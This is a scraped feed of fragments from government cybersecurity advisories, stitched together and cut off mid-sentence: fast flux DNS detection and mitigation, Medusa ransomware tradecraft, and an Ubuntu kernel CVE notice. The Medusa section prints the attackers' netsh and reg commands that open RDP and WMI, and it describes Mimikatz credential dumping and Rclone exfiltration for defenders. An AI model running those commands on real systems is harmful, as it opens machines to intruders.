title=\"D3-NI\">D3-NI</a>] and restrictions to limit access and utilize additional attributes (such as device information, environment, and access path) when making access decisions [<a href=\"https://d3fend.mitre.org/technique/d3f:AccessMediation/\" target=\"_blank\" title=\"D3-AMED\">D3-AMED</a>].\n<ul>\n<li>Consider Zero Trust principles when designing systems.

    "link": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-093a",
    "summary": "<strong>Executive summary</strong>\n<p>Many networks have a gap in their defenses for detecting and blocking a malicious technique known as “fast flux.” This technique poses a significant threat to national security, enabling malicious cyber actors to consistently evade detection. Malicious cyber actors, including cybercriminals and nation-state actors, use fast flux to obfuscate the locations of malicious servers by rapidly changing Domain Name System (DNS) records. Additionally, they can create resilient, highly available command and control (C2) infrastructure, concealing their subsequent malicious operations. This resilient and fast changing infrastructure makes tracking and blocking malicious activities that use fast flux more difficult. </p>\n<p>The National Security Agency (NSA), Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), Canadian Centre for Cyber Security (CCCS), and New Zealand National Cyber Security Centre (NCSC-NZ) are releasing this joint cybersecurity advisory (CSA) to warn organizations, Internet service providers (ISPs), and cybersecurity service providers of the ongoing threat of fast flux enabled malicious activities as a defensive gap in many networks. This advisory is meant to encourage service providers, especially Protective DNS (PDNS) providers, to help mitigate this threat by taking proactive steps to develop accurate, reliable, and timely fast flux detection analytics and blocking capabilities for their customers. This CSA also provides guidance on detecting and mitigating elements of malicious fast flux by adopting a multi-layered approach that combines DNS analysis, network monitoring, and threat intelligence. </p>\n<p>The authoring agencies recommend all stakeholders—government and providers—collaborate to develop and implement scalable solutions to close this ongoing gap in network defenses against malicious fast flux activity.</p>\n<p>Download the PDF version of this report: <a href=\"https://media.defense.gov/2025/Apr/02/2003681172/-1/-1/0/CSA-FAST-FLUX.PDF\">Fast Flux: A National Security Threat</a> (PDF, 841 KB).</p>\n<strong>Technical details</strong>\n<p>When malicious cyber actors compromise devices and networks, the malware they use needs to “call home” to send status updates and receive further instructions. To decrease the risk of detection by network defenders, malicious cyber actors use dynamic resolution techniques, such as fast flux, so their communications are less likely to be detected as malicious and blocked. </p>\n<p>Fast flux refers to a domain-based technique that is characterized by rapidly changing the DNS records (e.g., IP addresses) associated with a single domain [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1568/001/\" target=\"_blank\" title=\"Dynamic Resolution: Fast Flux DNS\">T1568.001</a>]. </p>\n<strong>Single and double flux</strong>\n<p>Malicious cyber actors use two common variants of fast flux to perform operations:</p>\n<p><strong>1. </strong>Single flux: A single domain name is linked to numerous IP addresses, which are frequently rotated in DNS responses. This setup ensures that if one IP address is blocked or taken down, the domain remains accessible through the other IP addresses. See Figure 1 as an example to illustrate this technique.</p>\n\n \n\nFigure 1: Single flux technique.\n\n<p><strong>Note:</strong> This behavior can also be used for legitimate purposes for performance reasons in dynamic hosting environments, such as in content delivery networks and load balancers.</p>\n<p><strong>2. </strong>Double flux: In addition to rapidly changing the IP addresses as in single flux, the DNS name servers responsible for resolving the domain also change frequently. This provides an additional layer of redundancy and anonymity for malicious domains. Double flux techniques have been observed using both Name Server (NS) and Canonical Name (CNAME) DNS records. See Figure 2 as an example to illustrate this technique.</p>\n\n \n\nFigure 2: Double flux technique. \n\n<p>Both techniques leverage a large number of compromised hosts, usually as a botnet from across the Internet that acts as proxies or relay points, making it difficult for network defenders to identify the malicious traffic and block or perform legal enforcement takedowns of the malicious infrastructure. Numerous malicious cyber actors have been reported using the fast flux technique to hide C2 channels and remain operational. Examples include:</p>\n<ul>\n<li>Bulletproof hosting (BPH) services offer Internet hosting that disregards or evades law enforcement requests and abuse notices. These providers host malicious content and activities while providing anonymity for malicious cyber actors. Some BPH companies also provide fast flux services, which help malicious cyber actors maintain connectivity and improve the reliability of their malicious infrastructure. [1]\n<ul>\n<li>Refer to ASD’s ACSC’s <a href=\"https://www.cyber.gov.au/about-us/view-all-content/publications/bulletproof-hosting-providers\" target=\"_blank\" title='\"Bulletproof\" hosting providers Cracks in the armour of cybercriminal infrastructure'>“Bulletproof” hosting providers: Cracks in the armour of cybercriminal infrastructure</a> for more information on BPH providers. [2]</li>\n</ul>\n</li>\n<li>Fast flux has been used in Hive and Nefilim ransomware attacks. [3], [4]</li>\n<li>Gamaredon uses fast flux to limit the effectiveness of IP blocking. [5], [6], [7]</li>\n</ul>\n<p>The key advantages of fast flux networks for malicious cyber actors include:</p>\n<ul>\n<li><strong>Increased resilience.</strong> As a fast flux network rapidly rotates through botnet devices, it is difficult for law enforcement or abuse notifications to process the changes quickly and disrupt their services.</li>\n<li><strong>Render IP blocking ineffective</strong>. The rapid turnover of IP addresses renders IP blocking irrelevant since each IP address is no longer in use by the time it is blocked. This allows criminals to maintain resilient operations.</li>\n<li><strong>Anonymity</strong>. Investigators face challenges in tracing malicious content back to the source through fast flux networks. This is because malicious cyber actors’ C2 botnets are constantly changing the associated IP addresses throughout the investigation.</li>\n</ul>\n<strong>Additional malicious uses</strong>\n<p>Fast flux is not only used for maintaining C2 communications, it also can play a significant role in phishing campaigns to make social engineering websites harder to block or take down. Phishing is often the first step in a larger and more complex cyber compromise. Phishing is typically used to trick victims into revealing sensitive information (such as login passwords, credit card numbers, and personal data), but can also be used to distribute malware or exploit system vulnerabilities. Similarly, fast flux is used for maintaining high availability for cybercriminal forums and marketplaces, making them resilient against law enforcement takedown efforts. </p>\n<p>Some BPH providers promote fast flux as a service differentiator that increases the effectiveness of their clients’ malicious activities. For example, one BPH provider posted on a dark web forum that it protects clients from being added to Spamhaus blocklists by easily enabling the fast flux capability through the service management panel (See Figure 3). A customer just needs to add a \"dummy server interface,\" which redirects incoming queries to the host server automatically. By doing so, only the dummy server interfaces are reported for abuse and added to the Spamhaus blocklist, while the servers of the BPH customers remain \"clean\" and unblocked. </p>\n\n \n\nFigure 3: Example dark web fast flux advertisement.\n\n<p>The BPH provider further explained that numerous malicious activities beyond C2, including botnet managers, fake shops, credential stealers, viruses, spam mailers, and others, could use fast flux to avoid identification and blocking. </p>\n<p>As another example, a BPH provider that offers fast flux as a service advertised that it automatically updates name servers to prevent the blocking of customer domains. Additionally, this provider further promoted its use of separate pools of IP addresses for each customer, offering globally dispersed domain registrations for increased reliability.</p>\n<strong>Detection techniques</strong>\n<p>The authoring agencies recommend that ISPs and cybersecurity service providers, especially PDNS providers, implement a multi-layered approach, in coordination with customers, using the following techniques to aid in detecting fast flux activity [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CISA CPG 3.A</a>]. However, quickly detecting malicious fast flux activity and differentiating it from legitimate activity remains an ongoing challenge to developing accurate, reliable, and timely fast flux detection analytics. </p>\n<p><strong>1. </strong>Leverage threat intelligence feeds and reputation services to identify known fast flux domains and associated IP addresses, such as in boundary firewalls, DNS resolvers, and/or SIEM solutions.</p>\n<p><strong>2. </strong>Implement anomaly detection systems for DNS query logs to identify domains exhibiting high entropy or IP diversity in DNS responses and frequent IP address rotations. Fast flux domains will frequently cycle though tens or hundreds of IP addresses per day.</p>\n<p><strong>3.</strong> Analyze the time-to-live (TTL) values in DNS records. Fast flux domains often have unusually low TTL values. A typical fast flux domain may change its IP address every 3 to 5 minutes.</p>\n<p><strong>4.</strong> Review DNS resolution for inconsistent geolocation. Malicious domains associated with fast flux typically generate high volumes of traffic with inconsistent IP-geolocation information.</p>\n<p><strong>5. </strong>Use flow data to identify large-scale communications with numerous different IP addresses over short periods.</p>\n<p><strong>6.</strong> Develop fast flux detection algorithms to identify anomalous traffic patterns that deviate from usual network DNS behavior.</p>\n<p><strong>7.</strong> Monitor for signs of phishing activities, such as suspicious emails, websites, or links, and correlate these with fast flux activity. Fast flux may be used to rapidly spread phishing campaigns and to keep phishing websites online despite blocking attempts.</p>\n<p><strong>8. </strong>Implement customer transparency and share information about detected fast flux activity, ensuring to alert customers promptly after confirmed presence of malicious activity.</p>\n<strong>Mitigations</strong>\nAll organizations\n<p>To defend against fast flux, government and critical infrastructure organizations should coordinate with their Internet service providers, cybersecurity service providers, and/or their Protective DNS services to implement the following mitigations utilizing accurate, reliable, and timely fast flux detection analytics. </p>\n<p><strong>Note:</strong> Some legitimate activity, such as common content delivery network (CDN) behaviors, may look like malicious fast flux activity. Protective DNS services, service providers, and network defenders should make reasonable efforts, such as allowlisting expected CDN services, to avoid blocking or impeding legitimate content.</p>\n<p><strong>1. </strong>DNS and IP blocking and sinkholing of malicious fast flux domains and IP addresses</p>\n<ul>\n<li>Block access to domains identified as using fast flux through non-routable DNS responses or firewall rules.</li>\n<li>Consider sinkholing the malicious domains, redirecting traffic from those domains to a controlled server to capture and analyze the traffic, helping to identify compromised hosts within the network.</li>\n<li>Block IP addresses known to be associated with malicious fast flux networks.</li>\n</ul>\n<p><strong>2.</strong> Reputational filtering of fast flux enabled malicious activity</p>\n<ul>\n<li>Block traffic to and from domains or IP addresses with poor reputations, especially ones identified as participating in malicious fast flux activity.</li>\n</ul>\n<p><strong>3. </strong>Enhanced monitoring and logging</p>\n<ul>\n<li>Increase logging and monitoring of DNS traffic and network communications to identify new or ongoing fast flux activities.</li>\n<li>Implement automated alerting mechanisms to respond swiftly to detected fast flux patterns.</li>\n<li>Refer to ASD’s ACSC joint publication, <a href=\"https://www.cyber.gov.au/resources-business-and-government/maintaining-devices-and-systems/system-hardening-and-administration/system-monitoring/best-practices-event-logging-threat-detection\" target=\"_blank\" title=\"Best practices for event logging and threat detection\">Best practices for event logging and threat detection</a>, for further logging recommendations.</li>\n</ul>\n<p><strong>4. </strong>Collaborative defense and information sharing</p>\n<ul>\n<li>Share detected fast flux indicators (e.g., domains, IP addresses) with trusted partners and threat intelligence communities to enhance collective defense efforts. Examples of indicator sharing initiatives include CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/information-sharing/automated-indicator-sharing-ais\" title=\"Automated Indicator Sharing\">Automated Indicator Sharing</a> or sector-based Information Sharing and Analysis Centers (ISACs) and ASD’s <a href=\"https://www.cyber.gov.au/about-us/view-all-content/news-and-media/join-the-cyber-threat-intelligence-sharing-service-through-sentinel\" target=\"_blank\" title=\"Cyber Threat Intelligence Sharing Platform\">Cyber Threat Intelligence Sharing Platform</a> (CTIS) in Australia.</li>\n<li>Participate in public and private information-sharing programs to stay informed about emerging fast flux tactics, techniques, and procedures (TTPs). Regular collaboration is particularly important because most malicious activity by these domains occurs within just a few days of their initial use; therefore, early discovery and information sharing by the cybersecurity community is crucial to minimizing such malicious activity. [8]</li>\n</ul>\n<p><strong>5. </strong>Phishing awareness and training</p>\n<ul>\n<li>Implement employee awareness and training programs to help personnel identify and respond appropriately to phishing attempts.</li>\n<li>Develop policies and procedures to manage and contain phishing incidents, particularly those facilitated by fast flux networks.</li>\n<li>For more information on mitigating phishing, see joint <a href=\"https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one\" title=\"Phishing Guidance: Stopping the Attack Cycle at Phase One\">Phishing Guidance: Stopping the Attack Cycle at Phase One</a>.</li>\n</ul>\nNetwork defenders\n<p>The authoring agencies encourage organizations to use cybersecurity and PDNS services that detect and block fast flux. By leveraging providers that detect fast flux and implement capabilities for DNS and IP blocking, sinkholing, reputational filtering, enhanced monitoring, logging, and collaborative defense of malicious fast flux domains and IP addresses, organizations can mitigate many risks associated with fast flux and maintain a more secure environment. </p>\n<p>However, some PDNS providers may not detect and block malicious fast flux activities. Organizations should not assume that their PDNS providers block malicious fast flux activity automatically and should contact their PDNS providers to validate coverage of this specific cyber threat. </p>\n<p>For more information on PDNS services, see the 2021 joint cybersecurity information sheet from NSA and CISA about <a href=\"https://media.defense.gov/2025/Mar/24/2003675043/-1/-1/0/CSI-SELECTING-A-PROTECTIVE-DNS-SERVICE-V1.3.PDF\" target=\"_blank\" title=\"Selecting a Protective DNS Service\">Selecting a Protective DNS Service</a>.

By implementing robust detection and mitigation strategies, organizations can significantly reduce their risk of compromise by fast flux-enabled threats. </p>\n<p>The authoring agencies strongly recommend organizations engage their cybersecurity providers on developing a multi-layered approach to detect and mitigate malicious fast flux operations. Utilizing services that detect and block fast flux enabled malicious cyber activity can significantly bolster an organization's cyber defenses. </p>\n<strong>Works cited</strong>\n<p>[1] Intel471.

See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>\nBackground\n<p>The RaaS Medusa variant has been used to conduct ransomware attacks from 2021 to present. Medusa originally operated as a closed ransomware variant, meaning all development and associated operations were controlled by the same group of cyber threat actors. While Medusa has since progressed to using an affiliate model, important operations such as ransom negotiation are still centrally controlled by the developers. Both Medusa developers and affiliates—referred to as “Medusa actors” in this advisory—employ a double extortion model, where they encrypt victim data and threaten to publicly release exfiltrated data if a ransom is not paid.</p>\nInitial Access\n<p>Medusa developers typically recruit initial access brokers (IABs) in cybercriminal forums and marketplaces to obtain initial access [<a href=\"https://attack.mitre.org/versions/v16/tactics/TA0001/\" title=\"Initial Access\">TA0001</a>] to potential victims. Potential payments between $100 USD and $1 million USD are offered to these affiliates with the opportunity to work exclusively for Medusa. Medusa IABs (affiliates) are known to make use of common techniques, such as:</p>\n<ul>\n<li><strong>Phishing campaigns</strong> as a primary method for stealing victim credentials [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1566/\" title=\"Phishing\">T1566</a>].</li>\n<li><strong>Exploitation of unpatched software vulnerabilities [</strong><a href=\"https://attack.mitre.org/versions/v16/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a><strong>]</strong> through Common Vulnerabilities and Exposures (CVEs) such as the ScreenConnect vulnerability <a href=\"https://www.cve.org/CVERecord?id=CVE-2024-1709\" title=\"Authentication bypass using an alternate path or channel\">CVE-2024-1709</a> [<a href=\"https://cwe.mitre.org/data/definitions/288.html\" title=\"Authentication Bypass Using an Alternate Path or Channel\">CWE-288: Authentication Bypass Using an Alternate Path or Channel</a>] and Fortinet EMS SQL injection vulnerability [<a href=\"https://www.cve.org/CVERecord?id=CVE-2023-48788\" title=\"CVE-2023-48788\">CVE-2023-48788</a> [<a href=\"https://cwe.mitre.org/data/definitions/89.html\" title=\"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\">CWE 89: SQL Injection</a>].</li>\n</ul>\nDiscovery\n<p>Medusa actors use <a href=\"https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques\" title=\"Identifying and Mitigating Living Off the Land Techniques\">living off the land (LOTL)</a> and legitimate tools Advanced IP Scanner and SoftPerfect Network Scanner for initial user, system, and network enumeration. Once a foothold in a victim network is established, commonly scanned ports include:</p>\n<ul>\n<li><code>21</code> (FTP)</li>\n<li><code>22</code> (SSH)</li>\n<li><code>23</code> (Telnet)</li>\n<li><code>80</code> (HTTP)</li>\n<li><code>115</code> (SFTP)</li>\n<li><code>443</code> (HTTPS)</li>\n<li><code>1433</code> (SQL database)</li>\n<li><code>3050</code> (Firebird database)</li>\n<li><code>3128</code> (HTTP web proxy)</li>\n<li><code>3306</code> (MySQL database)</li>\n<li><code>3389</code> (RDP)</li>\n</ul>\n<p>Medusa actors primarily use PowerShell [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>] and the Windows Command Prompt (cmd.exe) [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1059/003/\" title=\"Command and Scripting Interpreter: Windows Command Shell\">T1059.003</a>] for network [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>] and filesystem enumeration [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a>] and to utilize Ingress Tool Transfer capabilities [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a>].

Investigations identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, PDQ Deploy, PDQ Inventory, SimpleHelp, and Splashtop. Medusa uses these tools—in combination with Remote Desktop Protocol (RDP) [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>] and PsExec [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1569/002/\" title=\"System Services: Service Execution\">T1569.002</a>]—to move laterally [<a href=\"https://attack.mitre.org/versions/v16/tactics/TA0008/\" title=\"Lateral Movement\">TA0008</a>] through the network and identify files for exfiltration [<a href=\"https://attack.mitre.org/versions/v16/tactics/TA0010/\" title=\"Exfiltration\">TA0010</a>] and encryption [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. When provided with valid username and password credentials, Medusa actors use PsExec to:</p>\n<ul>\n<li>Copy (<code>-c</code>) one script from various batch scripts on the current machine to the remote machine and execute it with <code>SYSTEM</code> level privileges (<code>-s</code>).</li>\n<li>Execute an already existing local file on a remote machine with <code>SYSTEM</code> level privileges.</li>\n<li>Execute remote shell commands using <code>cmd /c</code>.</li>\n</ul>\n<p>One of the batch scripts executed by PsExec is <code>openrdp.bat</code>, which first creates a new firewall rule to allow inbound TCP traffic on port <code>3389</code>:</p>\n<ul>\n<li><code>netsh advfirewall firewall add rule name=\"rdp\" dir=in protocol=tcp localport=3389 action=allow</code></li>\n</ul>\n<p>Then, a rule to allow remote WMI connections is created:</p>\n<ul>\n<li><code>netsh advfirewall firewall set rule group=\"windows management instrumentation (wmi)\" new enable=yes</code></li>\n</ul>\n<p>Finally, the registry is modified to allow Remote Desktop connections:</p>\n<ul>\n<li><code>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></li>\n</ul>\n<p><a href=\"https://attack.mitre.org/versions/v16/software/S0002/\" title=\"Mimikatz\">Mimikatz</a> has also been observed in use for Local Security Authority Subsystem Service (LSASS) dumping [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a>] to harvest credentials [<a href=\"https://attack.mitre.org/tactics/TA0006/\" title=\"Credential Access\">TA0006</a>] and aid lateral movement.</p>\nExfiltration and Encryption\n<p>Medusa actors install and use <a href=\"https://attack.mitre.org/versions/v16/software/S1040/\" title=\"Rclone\">Rclone</a> to facilitate exfiltration of data to the Medusa C2 servers [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a>] used by actors and affiliates. The actors use Sysinternals PsExec, PDQ Deploy, or BigFix [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1072/\" title=\"Software Deployment Tools\">T1072</a>] to deploy the encryptor, <code>gaze.exe</code>, on files across the network—with the actors disabling Windows Defender and other antivirus services on specific targets. Encrypted files have a <code>.medusa</code> file extension. The process <code>gaze.exe</code> terminates all services [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1489/\" title=\"Service Stop\">T1489</a>] related to backups, security, databases, communication, file sharing and websites, then deletes shadow copies [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>] and encrypts files with AES-256 before dropping the ransom note. The actors then manually turn off [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1529/\" title=\"System Shutdown/Reboot\">T1529</a>] and encrypt virtual machines and delete their previously installed tools [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>].</p>\nExtortion\n<p>Medusa RaaS employs a double extortion model, where victims must pay [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1657/\" title=\"Financial Theft\">T1657</a>] to decrypt files and prevent further release. The ransom note demands victims make contact within 48 hours via either a Tor browser based live chat, or via Tox, an end-to-end encrypted instant-messaging platform. If the victim does not respond to the ransom note, Medusa actors will reach out to them directly by phone or email. Medusa operates a <code>.onion</code> data leak site, divulging victims alongside countdowns to the release of information. Ransom demands are posted on the site, with direct hyperlinks to Medusa affiliated cryptocurrency wallets. At this stage, Medusa concurrently advertises sale of the data to interested parties before the countdown timer ends. Victims can additionally pay $10,000 USD in cryptocurrency to add a day to the countdown timer.</p>\n<p>FBI investigations identified that after paying the ransom, one victim was contacted by a separate Medusa actor who claimed the negotiator had stolen the ransom amount already paid and requested half of the payment be made again to provide the “true decryptor”— potentially indicating a triple extortion scheme.</p>\n<strong>Indicators of Compromise</strong>\n<p><strong>Table 1</strong> lists the hashes of malicious files obtained during investigations.</p>\n\n\n<em>Table 1: Malicious Files</em>\n\n\nFiles\nHash (MD5)\nDescription\n\n\n\n\n!!!READ_ME_MEDUSA!!!.txt\nRedacted\nRansom note file\n\n\nopenrdp.bat\n44370f5c977e415981febf7dbb87a85c\nAllows incoming RDP and remote WMI connections\n\n\npu.exe\n80d852cd199ac923205b61658a9ec5bc\nReverse shell\n\n\n\n<p><strong>Table 2</strong> includes email addresses used by Medusa actors to extort victims; they are exclusively used for ransom negotiation and contacting victims following compromise.

In particular, require employees to use long passwords and consider not requiring frequently recurring password changes, as these can weaken security [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#UniqueCredentials2C\" title=\"Unique Credentials\">CPG 2.C</a>].</li>\n<li><strong>Require multifactor authentication</strong> for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA)\">CPG 2.H</a>].</li>\n<li><strong>Keep all operating systems, software, and firmware up to date.</strong> Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities \">CPG 1.E</a>].</li>\n<li><strong>Segment networks</strong> to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#NetworkSegmentation2F\" title=\"Network Segmentation\">CPG 2.F</a>].</li>\n<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.</strong> To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs\">CPG 3.A</a>].</li>\n<li><strong>Require VPNs or Jump Hosts for remote access.</strong></li>\n<li><strong>Monitor for unauthorized scanning and access attempts.</strong></li>\n<li><strong>Filter network traffic</strong> by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents threat actors from directly connecting to remote access services that they have established for persistence.</li>\n<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts\">CPG 2.E</a>].</li>\n<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#AssetInventory1A\" title=\"Asset Inventory\">CPG 1.A</a>, <a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#DocumentDeviceConfigurations2O\" title=\"Document Device Configurations\">2.O</a>].</li>\n<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts \">CPG 2.E</a>, <a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default\">2.N</a>].</li>\n<li><strong>Disable unused ports</strong>[<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#ProhibitConnectionofUnauthorizedDevices2V\" title=\"Prohibit Connection of Unauthorized Devices\">CPG 2.V</a>].</li>\n<li><strong>Maintain offline backups of data,</strong> and regularly maintain backup and restoration [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#SystemBackups2R\" title=\"System Backups\">CPG 2.R</a>]. By instituting this practice, the organization helps ensure they will not be severely interrupted and/or only have irretrievable data.</li>\n<li><strong>Ensure all backup data is encrypted, immutable</strong> (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#StrongandAgileEncryption2K\" title=\"Strong and Agile Encryption \">CPG 2.K</a>, <a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#SecureSensitiveData2L\" title=\"Secure Sensitive Data\">2.L</a>, <a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#SystemBackups2R\" title=\"System Backups\">2.R</a>].</li>\n</ul>\n<strong>Validate Security Controls</strong>\n<p>In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK Matrix for Enterprise framework in this advisory. The FBI, CISA, and MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol>\n<li>Select an ATT&amp;CK technique described in this advisory (<strong>Table 3</strong> to <strong>Table 11</strong>).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol>\n<p>The FBI, CISA, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<strong>Resources</strong>\n<ul>\n<li>Joint <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\" title=\"#StopRansomware Guide\">#StopRansomware Guide</a>.</li>\n<li>Joint Guide <a href=\"https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques\" title=\"Identifying and Mitigating Living Off the Land Techniques\">Identifying and Mitigating Living Off the Land Techniques</a>.</li>\n<li>Joint <a href=\"https://www.cisa.gov/resources-tools/resources/guide-securing-remote-access-software\" title=\"Guide to Securing Remote Access Software\">Guide to Securing Remote Access Software</a>.</li>\n</ul>\n<strong>Reporting</strong>\n<p>Your organization has no obligation to respond or provide information back to FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to FBI, reporting must be consistent with applicable state and federal laws.</p>\n<p>FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>\n<p>Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>\n<p>The FBI, CISA, and MS-ISAC do not encourage paying ransoms as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI, CISA, and MS-ISAC urge you to promptly report ransomware incidents to FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\">Internet Crime Complaint Center (IC3)</a>, a <a href=\"https://www.fbi.gov/contact-us/field-offices\">local FBI Field Office</a>, or CISA via the agency’s <a href=\"https://www.cisa.gov/report\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\">report@cisa.gov</a>) or by calling 1-844-Say-CISA (1-844-729-2472).</p>\n<strong>Disclaimer</strong>\n<p>The information in this report is being provided “as is” for informational purposes only.

    "summary": "It was discovered that improper initialization of CPU cache memory could\nallow a local attacker with hypervisor access to overwrite SEV-SNP guest\nmemory resulting in loss of data integrity. (CVE-2024-36331)\n\nOleksii Oleksenko, Cedric Fournet, Jana Hofmann, Boris Köpf, Stavros Volos,\nand Flavien Solt discovered that some AMD processors may allow an attacker\nto infer data from previous stores, potentially resulting in the leakage of\nprivileged information. A local attacker could possibly use this to expose\nsensitive information. (CVE-2024-36350, CVE-2024-36357)\n\nSeveral security issues were discovered in the Linux kernel.\nAn attacker could possibly use these to compromise the system.\nThis update corrects flaws in the
